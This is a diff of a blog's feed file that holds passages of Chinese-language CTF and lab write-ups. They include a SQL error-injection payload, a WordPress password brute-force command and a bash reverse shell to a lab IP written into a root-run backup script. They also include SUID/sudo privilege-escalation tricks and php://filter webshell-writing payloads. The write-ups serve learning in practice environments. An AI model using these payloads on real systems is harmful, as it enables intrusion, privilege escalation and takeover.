 &lt;/div&gt;&lt;p&gt;无列名注入只能注出部分flag&lt;code&gt;CISCN{ZI9VA-3PWY5-S9RKF-O3I1T-Q3CEN-&lt;/code&gt;，后面部分注不出来了，需要尝试别的方法。参考&lt;a href=&#34;https://www.cnblogs.com/GH-D/p/11962522.html&#34;&gt;https://www.cnblogs.com/GH-D/p/11962522.html&lt;/a&gt;使用join获得列名然后直接报错注入获得flag。&lt;/p&gt;
 &lt;p&gt;payload&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;admin&#39;)||(extractvalue(1,concat(0x7e,substr((select`33faf19d-e30e-45a7-8aca-3272c975f54f`from`flag`),10),0x7e)))#
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin&#39;)||(extractvalue(1,concat(0x7e,substr((select`33faf19d-e30e-45a7-8aca-3272c975f54f`from`flag`),10),0x7e)))#
 # CISCN{zi9vA-3pwY5-S9rKf-o3I1t-Q3CeN-}
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;web-easy_source&#34;&gt;web-easy_source&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -5145,7 +5543,7 @@ Database: security
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;扫目录扫到&lt;code&gt;/.listing&lt;/code&gt;路由，访问得到文件信息&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;total 16 drwxr-xr-x 1 root root 4096 May 6 06:02 .
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;total 16 drwxr-xr-x 1 root root 4096 May 6 06:02 .
 drwxr-xr-x 1 root root 4096 Sep 22 2016 ..
 -rw-r--r-- 1 root root 257 Apr 29 11:46 index.php
 -rw-r--r-- 1 root root 19 Apr 29 10:51 you_can_seeeeeeee_me.php
@@ -5379,13 +5777,13 @@ drwxr-xr-x 1 root root 4096 Sep 22 2016 ..
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;两个结合起来不难发现需要上传zip（php的Unicode绕过找不到），但是后缀中不能包含i，参考&lt;a href=&#34;https://bugs.php.net/bug.php?id=70072&#34;&gt;https://bugs.php.net/bug.php?id=70072&lt;/a&gt;发现可以使用&lt;code&gt;İ&lt;/code&gt;绕过，图片尺寸通过以下payload绕过（位置可以不在头部）&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;#define height 1
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#define height 1
 #define width 1
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后上传，访问&lt;code&gt;example.php&lt;/code&gt;利用目录穿越解压zip解压出php执行。前面都不是很麻烦，主要是后面的图片马内容修改，网上流传的&lt;code&gt;&amp;lt;?=$_GET[0]($_POST[1]);?&amp;gt;&lt;/code&gt;在php7.2加上&lt;code&gt;disable_function&lt;/code&gt;后局限性有点大，很难找到可以使用的函数了。参考&lt;a href=&#34;https://blog.csdn.net/miuzzx/article/details/116885083&#34;&gt;ciscn国赛初赛web（4道低分题）&lt;/a&gt;改payload，然后将写入尺寸信息的txt文件一并压入压缩包绕过尺寸判断（抓包添加也可以，不过这时候Unicode字符会被解析为?，需要使用URL编码或改一下bp的字体），解压后直接连蚁剑翻&lt;code&gt;/etc&lt;/code&gt;&lt;/p&gt;
 &lt;h2 id=&#34;web-filterunsolved&#34;&gt;web-filter|unsolved&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;hint:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;据说这是配置文件里面的重要内容，或许对你有用！！
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;据说这是配置文件里面的重要内容，或许对你有用！！
   &#39;log&#39; =&amp;gt; [
       &#39;traceLevel&#39; =&amp;gt; YII_DEBUG ? 0 : 0,
       &#39;targets&#39; =&amp;gt; [
@@ -5484,7 +5882,7 @@ nmap --min-rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;扫描结果&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 | ssh-hostkey: 
 |   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
@@ -5516,7 +5914,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;扫不粗来，需要api-token。。。懒得注册了，直接&lt;a href=&#34;https://www.0x1ceb00da.net/harry-potter-aragog/&#34;&gt;wp&lt;/a&gt;得到漏洞信息&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt; | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
  |     Fixed in: 6.9
  |     References:
  |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9
@@ -5546,7 +5944,7 @@ run
 &lt;/div&gt;&lt;p&gt;成功获得shell。&lt;/p&gt;
 &lt;h3 id=&#34;horcrux1txt&#34;&gt;horcrux1.txt&lt;/h3&gt;
 &lt;p&gt;在&lt;code&gt;/home/hagrid98&lt;/code&gt;下获得第一个flag：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
 # horcrux_{1: RidDlE&#39;s DiAry dEstroYed By haRry in chaMbEr of SeCrets}
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;horcrux2txt&#34;&gt;horcrux2.txt&lt;/h3&gt;
 &lt;p&gt;没啥办法，继续收集信息吧，在&lt;code&gt;/etc/wordpress&lt;/code&gt;获得配置信息&lt;/p&gt;
@@ -5583,11 +5981,11 @@ run
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;在&lt;code&gt;wp_users&lt;/code&gt;表中找到用户信息&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;hagrid98 | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin | hagrid98@localhost.local
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hagrid98 | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin | hagrid98@localhost.local
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;知道管理员用户名就可以爆破wordpress后台密码，再上wpscan&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;wpscan --url http://192.168.150.135/blog --passwords /usr/share/wordlists/fasttrack.txt --usernames hagrid98
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wpscan --url http://192.168.150.135/blog --passwords /usr/share/wordlists/fasttrack.txt --usernames hagrid98
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果：&lt;code&gt;Username: hagrid98, Password: password123&lt;/code&gt;，然后执行&lt;code&gt;su hagrid98 &lt;/code&gt;登录用户。这样我们就有权限来读取用户目录下的&lt;code&gt;.viminfo&lt;/code&gt;文件来了解vim操作的内容&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# This viminfo file was generated by Vim 8.1.
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# This viminfo file was generated by Vim 8.1.
 # You may edit it if you&#39;re careful!
 
 # Viminfo version
@@ -5642,7 +6040,7 @@ run
         +       1       11
         +       3       20
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到这里对文件&lt;code&gt;/opt/.backup.sh&lt;/code&gt;做出过修改，既然之前能写入文件，那么我们肯定也有权限对其作出修改，简简单单弹个shell&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;echo &amp;quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.150.128/5555 0&amp;gt;&amp;amp;1&#39;&amp;quot; &amp;gt;&amp;gt; /opt/.backup.sh
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.150.128/5555 0&amp;gt;&amp;amp;1&#39;&amp;quot; &amp;gt;&amp;gt; /opt/.backup.sh
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来就出现了一个问题，如果直接执行脚本，那不还是这个用户吗？那有什么意义呢？我们可以看脚本内容&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -5653,11 +6051,11 @@ run
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;将文件备份到tmp下，现在去检查备份目录的权限&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;drwxr-xr-x 5 root root 4096 May 14 19:08 tmp_wp_uploads
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;drwxr-xr-x 5 root root 4096 May 14 19:08 tmp_wp_uploads
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到这是root权限，说明执行cp命令的是root，换言之，执行脚本的是root，那么我们的弹shell弹的就是root的shell，理解了之后访问一下站点激活备份，成功弹到root的shell。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210515000753.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;获得flag2&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
 # horcrux_{2: maRvoLo GaUnt&#39;s riNg deStrOyed bY DUmbledOre}
 &lt;/code&gt;&lt;/pre&gt;</content>
             
@@ -5768,7 +6166,7 @@ find / -user root -perm -4000 -exec ls -ldb &lt;span class=&#34;o&#34;&gt;{}&lt;
 &lt;/div&gt;&lt;p&gt;除此之外，常被提及的suid提权文件也能在实际使用时提供更为便捷的帮助，毕竟有目的的搜集比列一堆不知道啥玩意的要好得多。&lt;/p&gt;
 &lt;h5 id=&#34;nmap&#34;&gt;nmap&lt;/h5&gt;
 &lt;p&gt;&lt;code&gt;2.02~5.21&lt;/code&gt;版本的nmap存在交互模式，可以通过以下命令提权&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;nmap --interactive
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap --interactive
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;5.20&lt;/code&gt;版本之后interactive模块被删除，之前的姿势就不能用了，有师傅提出了&lt;code&gt;5.20&lt;/code&gt;版本之后的加载自定义script可以提权，但是经过测试发现生成shell的权限取决于使用nmap的用户。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -5782,10 +6180,10 @@ find / -user root -perm -4000 -exec ls -ldb &lt;span class=&#34;o&#34;&gt;{}&lt;
 &lt;blockquote&gt;
 &lt;p&gt;测试：&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;/etc/sudoers&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# Allow members of group sudo to execute any command
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改配置&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# Allow members of group sudo to execute any command
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Allow members of group sudo to execute any command
 # %sudo	ALL=(ALL:ALL) ALL
 tyskill	ALL=(root) NOPASSWD: /usr/bin/nmap
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时执行上面的payload，成功提权。&lt;/p&gt;
@@ -5843,7 +6241,7 @@ find tyskill -exec whoami &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt; &lt;spa
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;编译执行id命令返回&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;用户id=0(root) 组id=1000(tyskill) 组=1000(tyskill)
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;用户id=0(root) 组id=1000(tyskill) 组=1000(tyskill)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功提权。同理，Ubuntu的dash也可以这样绕过。&lt;/p&gt;
 &lt;h5 id=&#34;其他&#34;&gt;其他&lt;/h5&gt;
 &lt;blockquote&gt;
@@ -5979,7 +6377,7 @@ chmod +x ps
             
                 <content type="html">&lt;h2 id=&#34;find_it&#34;&gt;find_it&lt;/h2&gt;
 &lt;p&gt;robots.txt&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;When I was a child,I also like to read Robots.txt
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;When I was a child,I also like to read Robots.txt
 
 Here is what you want:1ndexx.php
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;.1ndexx.php.swp&lt;/code&gt;&lt;/p&gt;
@@ -7404,7 +7802,7 @@ php artisan serve --host&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0
                             
                             
                             
-                                <category scheme="https://tyskill.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" term="漏洞复现" label="漏洞复现" />
+                                <category scheme="https://tyskill.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" term="代码审计" label="代码审计" />
                             
                         
                     
@@ -7571,7 +7969,7 @@ php artisan serve --host&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;通过简单的审计我们可以发现&lt;code&gt;/file&lt;/code&gt;路由存在任意文件读(&lt;code&gt;os.path.join&lt;/code&gt;函数在接收绝对路径时会抛弃前面添加的路径)，剩下的考点应该是pickle反序列化RCE&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;/proc/self/environ&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;HOSTNAME=99d252572f0c
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HOSTNAME=99d252572f0c
 PYTHON_VERSION=3.8.2
 PWD=/app
 _=/usr/local/bin/python3
@@ -7930,13 +8328,13 @@ OLDPWD=/app
 &lt;h5 id=&#34;情况一&#34;&gt;情况一&lt;/h5&gt;
 &lt;p&gt;&lt;strong&gt;payload1&lt;/strong&gt;：&lt;code&gt;string.rot13&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;条件：short_open_tag=off&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?file=php://filter/string.rot13/resource=tyskill.php&amp;amp;content=&amp;lt;?cuc cucvasb();
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?file=php://filter/string.rot13/resource=tyskill.php&amp;amp;content=&amp;lt;?cuc cucvasb();
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;payload2&lt;/strong&gt;：&lt;code&gt;convert.base64-decode&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;如上面介绍所说，base64解码是4bytes一组，而&lt;code&gt;&amp;lt;?php exit();&lt;/code&gt;满足base64符号表的只有七个字符，因此需要在插入的base64编码字符串前面添加一个字符凑满4的倍数。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?file=php://filter/convert.base64-decode/resource=tyskill.php&amp;amp;content=xPD9waHAgcGhwaW5mbygpOw==
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?file=php://filter/convert.base64-decode/resource=tyskill.php&amp;amp;content=xPD9waHAgcGhwaW5mbygpOw==
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;payload3&lt;/strong&gt;：&lt;code&gt;convert.iconv.*&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;&amp;lt;?php exit();&lt;/code&gt;字符一共13位&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# usc-2: 对目标字符串进行2位一反转
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# usc-2: 对目标字符串进行2位一反转
 ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=tyskill.php&amp;amp;content=tyskill?&amp;lt;hp phpipfn(o;)
 # usc-4: 对目标字符串进行4位一反转
 ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=tyskill.php&amp;amp;content=tyskill?&amp;lt;hp phpipfn(o;)
@@ -7945,14 +8343,14 @@ OLDPWD=/app
 &lt;p&gt;&lt;strong&gt;payload1&lt;/strong&gt;：&lt;code&gt;string.rot13&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：short_open_tag=off&lt;/p&gt;
 &lt;p&gt;此时由于&lt;code&gt;//&lt;/code&gt;的注释效果，我们需要添加%0a换行从而执行php代码&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?content=php://filter/string.rot13|%0a&amp;lt;?cuc cucvasb();/resource=tyskill.php
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?content=php://filter/string.rot13|%0a&amp;lt;?cuc cucvasb();/resource=tyskill.php
 &lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;code&gt;convert.base64-decode&lt;/code&gt;不能使用，原因如下：&lt;/p&gt;
 &lt;p&gt;base64中&lt;code&gt;=&lt;/code&gt;字符起到一个填充的作用，也是结束的标识，如果在&lt;code&gt;=&lt;/code&gt;后面还存在字符则会解码失败，即使这里省略了write参数的=，resource的=仍然无法省略。所以这种既作为文件名又作为文件内容的无法使用单一base64解码解决。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;strong&gt;payload2&lt;/strong&gt;：&lt;code&gt;convert.iconv.*&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;&amp;lt;?php exit();&lt;/code&gt;字符一共13位&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# usc-2: 对目标字符串进行2位一反转
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# usc-2: 对目标字符串进行2位一反转
 ?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|tyskill?&amp;lt;hp phpipfn(o;)/resource=tyskill.php
 # usc-4: 对目标字符串进行4位一反转
 ?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|tyskill?&amp;lt;hp phpipfn(o;)/resource=tyskill.php
@@ -7966,19 +8364,19 @@ OLDPWD=/app
 &lt;h5 id=&#34;情况一-1&#34;&gt;情况一&lt;/h5&gt;
 &lt;p&gt;&lt;strong&gt;payload1&lt;/strong&gt;：&lt;code&gt;string.strip_tags|convert.base64-decode&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：php&amp;lt;7.3.0&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?file=php://filter/string.strip_tags|convert.base64-decode/resource=tyskill.php&amp;amp;content=?&amp;gt;PD9waHAgcGhwaW5mbygpOw==
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?file=php://filter/string.strip_tags|convert.base64-decode/resource=tyskill.php&amp;amp;content=?&amp;gt;PD9waHAgcGhwaW5mbygpOw==
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;payload2&lt;/strong&gt;：&lt;code&gt;string.strip_tags|convert.quoted-printable-decode&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：php&amp;lt;7.3.0&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?file=php://filter/string.strip_tags|convert.quoted-printable-decode/resource=tyskill.php&amp;amp;content=?&amp;gt;=3c=3f=70=68=70=20=70=68=70=69=6e=66=6f=28=29=3b
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?file=php://filter/string.strip_tags|convert.quoted-printable-decode/resource=tyskill.php&amp;amp;content=?&amp;gt;=3c=3f=70=68=70=20=70=68=70=69=6e=66=6f=28=29=3b
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;payload3&lt;/strong&gt;：&lt;a href=&#34;https://www.ambionics.io/blog/laravel-debug-rce&#34;&gt;LARAVEL &amp;lt;= V8.4.2 DEBUG MODE: REMOTE CODE EXECUTION&lt;/a&gt;提出的清空文件再写入操作&lt;/p&gt;
 &lt;p&gt;原理和上面也差不多，就是通过转换编码然后利用过滤器&lt;code&gt;convert.base64-decode&lt;/code&gt;删除文件内容从而写入我们自己的🐎(这个方法需要的过滤器有点多，正常情况下不需要用到。。。)&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;该姿势没办法用于情况二（可能是我没发现怎么用&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;1、准备🐎(正常来说清空文件那步CTF中用不到)&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;echo &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot; | base64 -w 0 | python3 -c &amp;quot;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot; | base64 -w 0 | python3 -c &amp;quot;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&amp;quot;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2、写入文件并删除干扰字符(a补足4位base64解码需求)&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=tyskill.php&amp;amp;content=a=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=7A=00=38=00=2B=00=43=00=67=00=3D=00=3D=00
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=tyskill.php&amp;amp;content=a=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=7A=00=38=00=2B=00=43=00=67=00=3D=00=3D=00
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样剩下的就是我们自己的🐎了&lt;/p&gt;
 &lt;p&gt;payload4（&lt;strong&gt;失败&lt;/strong&gt;）：&lt;code&gt;zlib.deflate|string.tolower|zlib.inflate&lt;/code&gt;&lt;/p&gt;
 &lt;blockquote&gt;
@@ -7986,25 +8384,25 @@ OLDPWD=/app
 写入内容：&lt;code&gt;&amp;lt;?php@?xit();&amp;lt;?php@phpinfo();&lt;/code&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;这写入内容看着就不像能成功的样子吧。。。也不知道啥条件下能解析成功&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?file=php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=tyskill.php&amp;amp;content=&amp;lt;?php+phpinfo();
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?file=php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=tyskill.php&amp;amp;content=&amp;lt;?php+phpinfo();
 &lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;情况二-1&#34;&gt;情况二&lt;/h5&gt;
 &lt;p&gt;&lt;strong&gt;payload1&lt;/strong&gt;：&lt;code&gt;string.strip_tags|convert.base64-decode&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：php&amp;lt;7.3.0&lt;/p&gt;
 &lt;p&gt;之前的写入失败是由于resource后面的=导致解码失败，借助&lt;code&gt;string.strip_tags&lt;/code&gt;的删除效果我们可以通过php标签删除=。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?content=php://filter/string.strip_tags|convert.base64-decode|?&amp;gt;PD9waHAgcGhwaW5mbygpOw==&amp;lt;?/resource=tyskill.php
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?content=php://filter/string.strip_tags|convert.base64-decode|?&amp;gt;PD9waHAgcGhwaW5mbygpOw==&amp;lt;?/resource=tyskill.php
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;payload2&lt;/strong&gt;：&lt;code&gt;string.strip_tags|convert.quoted-printable-decode&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：php&amp;lt;7.3.0&lt;/p&gt;
 &lt;p&gt;原理同上&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?content=php://filter/string.strip_tags|convert.quoted-printable-decode|?&amp;gt;=3c=3f=70=68=70=20=70=68=70=69=6e=66=6f=28=29=3b&amp;lt;?/resource=tyskill.php
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?content=php://filter/string.strip_tags|convert.quoted-printable-decode|?&amp;gt;=3c=3f=70=68=70=20=70=68=70=69=6e=66=6f=28=29=3b&amp;lt;?/resource=tyskill.php
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;payload3&lt;/strong&gt;：&lt;code&gt;convert.iconv.*|convert.base64-decode&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;通过&lt;code&gt;convert.iconv.*&lt;/code&gt;的编码转换也可以消除=，不过这里和上面使用&lt;code&gt;string.strip_tags&lt;/code&gt;不同的是这里需要考虑到payload本身字符的长度是否满足base64解码的需求&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;code&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;编码为&lt;code&gt;PD9waHAgcGhwaW5mbygpOz8+&lt;/code&gt;，前面添加的aa是为了补上前面58位长的base64字符，后面只要添加=(几个无所谓)就可以成功（原因我也不是很清楚&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;pre&gt;&lt;code&gt;?content=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|aaPD9waHAgcGhwaW5mbygpOz8+=/resource=tyskill.php
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?content=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|aaPD9waHAgcGhwaW5mbygpOz8+=/resource=tyskill.php
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;payload3（&lt;strong&gt;失败&lt;/strong&gt;）：&lt;code&gt;zlib.deflate|string.tolower|zlib.inflate&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;除了上面出现过的&lt;code&gt;@&lt;/code&gt;无法运行问题，还出现了新的问题：内容加了&lt;code&gt;&amp;lt;?&lt;/code&gt;就写不进去，不加又不能解析。。。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|%0a&amp;lt;?php phpinfo();/resource=tyskill.php
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|%0a&amp;lt;?php phpinfo();/resource=tyskill.php
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;其他&#34;&gt;其他&lt;/h3&gt;
 &lt;h4 id=&#34;segment-fault&#34;&gt;segment fault&lt;/h4&gt;
 &lt;blockquote&gt;
@@ -8502,7 +8900,7 @@ nmap --min-rate &lt;span class=&#34;m&#34;&gt;10000&lt;/span&gt; -T4 -A -sC 192.
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
